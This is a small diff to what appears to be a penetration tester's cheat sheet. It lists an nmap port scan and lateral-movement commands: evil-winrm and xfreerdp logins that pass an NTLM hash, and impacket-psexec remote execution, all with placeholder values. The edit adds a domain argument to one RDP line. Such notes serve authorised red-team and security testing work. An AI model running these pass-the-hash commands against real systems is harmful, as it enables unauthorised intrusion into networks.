@@ -6,7 +6,6 @@ nmap -Pn -iL <hosts> -p22,3389,5895,47001,88,389,445,80,443,21,8000,8080 -oA int
 ```
 
 
-
 ```
 #EVIL-WINRM
 evil-winrm -u <user> -H <hash> -i <ip>
@@ -17,6 +16,6 @@ impacket-psexec <domain>/<user>@<target-ip>
 
 #RDP
 xfreerdp /v:<ip> /u:<user> /pth:<hash> /d:<domain>
-xfreerdp /v:<ip> /u:<user> /pth:<hash>
+xfreerdp /v:<ip> /u:<user> /pth:<hash> /d:<domain>
 
 ```
